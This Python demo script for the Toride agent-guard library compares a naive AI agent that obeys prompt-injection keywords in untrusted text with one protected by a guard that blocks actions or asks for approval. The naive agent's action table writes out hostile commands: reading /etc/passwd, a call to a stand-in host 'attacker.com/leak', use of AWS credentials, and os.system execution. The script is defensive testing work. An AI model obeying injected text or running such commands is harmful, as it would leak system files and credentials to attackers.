"""Live security demo: naive agent vs Toride-guarded agent."""

from toride import AgentGuard, BlockedActionError, Decision, Source
from toride.fuzzer import INJECTION_PAYLOADS


def _naive_agent_decide(prompt: str) -> list[dict[str, str]]:
    """Naive agent that obeys injection keywords in untrusted text."""
    actions: list[dict[str, str]] = []
    prompt_lower = prompt.lower()

    if (
        "shell" in prompt_lower
        or "shell_exec" in prompt_lower
        or "command" in prompt_lower
        or "passwd" in prompt_lower
    ):
        actions.append({"type": "shell_exec", "payload": "cat /etc/passwd"})
    if "leak" in prompt_lower or "attacker" in prompt_lower or "send" in prompt_lower:
        actions.append({"type": "network_call", "payload": "http://attacker.com/leak"})
    if (
        "credential_use" in prompt_lower
        or "api_key" in prompt_lower
        or "mandatory" in prompt_lower
    ):
        actions.append({"type": "credential_use", "payload": "AWS_ACCESS_KEY_ID"})
    if "code_exec" in prompt_lower or "os.system" in prompt_lower:
        actions.append({"type": "code_exec", "payload": "import os; os.system('id')"})

    return actions


def run_demo() -> None:
    """Print a side-by-side vulnerable vs guarded agent comparison."""
    print("=" * 70)
    print("  TORIDE LIVE DEMO — Vulnerable agent vs guarded agent")
    print("=" * 70)

    print("\n[1/2] Naive agent (no guardrails)")
    naive_hijacked = 0
    for idx, item in enumerate(INJECTION_PAYLOADS, start=1):
        actions = _naive_agent_decide(item["payload"])
        if actions:
            print(f"  HIJACKED by payload #{idx} ({item['name']}) → {actions}")
            naive_hijacked += 1
        else:
            print(f"  safe against payload #{idx} ({item['name']})")

    print(
        f"\n  Result: {naive_hijacked}/{len(INJECTION_PAYLOADS)} payloads hijacked the agent"
    )

    print("\n[2/2] Toride-guarded agent")
    guard = AgentGuard()
    blocked = approved = executed = 0

    for idx, item in enumerate(INJECTION_PAYLOADS, start=1):
        tagged = guard.ingest(content=item["payload"], source=Source.WEB_FETCH)
        for action in _naive_agent_decide(item["payload"]):
            try:
                decision = guard.check_action(
                    action_type=action["type"],
                    payload=action["payload"],
                    source_content_ids=[tagged.id],
                )
                if decision == Decision.ALLOW:
                    print(f"  ALLOWED '{action['type']}' from payload #{idx}")
                    executed += 1
                elif decision == Decision.REQUIRE_APPROVAL:
                    print(
                        f"  APPROVAL required for '{action['type']}' "
                        f"(payload #{idx}, taint={tagged.trust_score})"
                    )
                    approved += 1
            except BlockedActionError as exc:
                print(f"  BLOCKED '{action['type']}' from payload #{idx}: {exc}")
                blocked += 1

    print("\n  Result:")
    print(f"    Blocked:           {blocked}")
    print(f"    Require approval:  {approved}")
    print(f"    Executed unsafely: {executed}")
    print("=" * 70)
    print("  pip install toride  →  import toride")
    print("  https://github.com/malrobust/TORIDE")
    print("=" * 70)


def main() -> None:
    run_demo()
